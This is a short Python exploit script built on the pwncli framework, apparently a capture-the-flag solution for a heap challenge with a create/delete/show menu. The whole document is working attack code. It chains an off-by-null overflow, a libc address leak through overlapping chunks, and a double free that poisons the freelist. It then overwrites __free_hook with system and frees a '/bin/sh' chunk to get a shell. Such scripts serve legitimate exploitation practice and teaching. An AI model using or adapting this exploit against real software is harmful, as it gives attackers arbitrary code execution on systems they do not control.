#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def create(size, data="a\n"):
    p.sendlineafter("Your choice :\n", "1")
    p.sendlineafter("Size: \n", str(size))
    p.sendafter("Data: \n", data)


def dele(idx):
    p.sendlineafter("Your choice :\n", "2")
    p.sendlineafter("Index: \n", str(idx))


def show(n):
    p.sendlineafter("Your choice :\n", "3")
    m = p.recvlines(n)
    info(f"Get msg: {m}")
    return m


"""
1. off by null
2. leak addr
3. double free
4. write system at __free_hook 
"""
create(0x420)
create(0x18)
create(0x520, flat({0x4f0:[0, 0x31, "\n"]}))

dele(1)
dele(0)
create(0x18, b"a"*0x10+p64(0x450)) # 0

dele(2)

create(0x420) # 1

m = show(2)

libc_base_addr = u64_ex(m[0][-7:-1]) - 0x3ebca0
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

create(0x18) # 2

dele(0)
dele(2)

create(0x18, p64(libc.sym['__free_hook'])+b"\n")
create(0x18, "/bin/sh\x00\n")
create(0x18, p64(libc.sym['system'])+b"\n")

dele(2)

get_flag_when_get_shell(p)


p.interactive()